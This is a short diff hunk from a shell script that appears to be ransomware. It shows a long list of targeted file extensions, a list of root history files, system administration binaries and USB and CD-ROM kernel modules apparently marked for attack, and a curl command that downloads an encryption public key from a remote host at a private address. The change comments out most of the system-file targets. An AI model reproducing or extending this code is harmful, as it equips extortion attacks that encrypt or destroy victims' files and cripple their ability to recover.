@@ -122,15 +122,17 @@ fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" 
           "*.xlv" "*.xpt" "*.cfg" "*.cwf" "*.dbb" "*.slt" "*.bp2" "*.bp3" "*.bpl" "*.clr" "*.dbx" "*.jc" "*.potm" "*.ppsm" \
           "*.prc" "*.prt" "*.shw" "*.std" "*.ver" "*.wpl" "*.xlm" "*.yps" "*.md3" "*.1cd")
 
-fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
-          "/bin/netstat" "/bin/mount" "/bin/kill" \
-          "/usr/sbin/useradd" "/usr/sbin/adduser" \
-          "/bin/chgrp" "/usr/sbin/userdel" "/usr/sbin/usermod" "/usr/sbin/visudo" \
-          "/usr/sbin/tcpdump" "/usr/sbin/service" "/sbin/reboot" "/sbin/shutdown" \
-          "/usr/sbin/mysqld" "/usr/sbin/dmidecode" "/usr/sbin/chroot" \
-          "/usr/sbin/chgpasswd" "/usr/sbin/apache2" "/usr/local/bin/*" \
-          "/lib/modules/$(uname -r)/kernel/drivers/usb/storage/usb-storage.ko" \
-          "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )
+fileList=("/root/.history" "/root/.bash_history")
+
+#fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
+#          "/bin/netstat" "/bin/mount" "/bin/kill" \
+#          "/usr/sbin/useradd" "/usr/sbin/adduser" \
+#          "/bin/chgrp" "/usr/sbin/userdel" "/usr/sbin/usermod" "/usr/sbin/visudo" \
+#          "/usr/sbin/tcpdump" "/usr/sbin/service" "/sbin/reboot" "/sbin/shutdown" \
+#          "/usr/sbin/mysqld" "/usr/sbin/dmidecode" "/usr/sbin/chroot" \
+#          "/usr/sbin/chgpasswd" "/usr/sbin/apache2" "/usr/local/bin/*" \
+#          "/lib/modules/$(uname -r)/kernel/drivers/usb/storage/usb-storage.ko" \
+#          "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )
 
 curl -k "https://192.168.1.132/downloads/${genKey}_pub.pem" > /root/pub.pem
 chmod 755 /root/pub.pem
